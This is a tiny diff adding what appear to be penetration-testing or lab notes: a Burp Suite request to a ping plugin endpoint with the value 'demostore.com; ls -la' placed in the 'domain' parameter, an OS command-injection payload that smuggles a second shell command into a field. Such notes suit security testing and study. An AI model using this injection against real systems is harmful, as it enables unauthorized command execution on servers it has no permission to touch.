@@ -1,0 +1,5 @@
+Burpsuite (URL ENCODING)
+POST /plugins/ping/index.php
+
+in "domain" variable
+demostore.com; ls -la
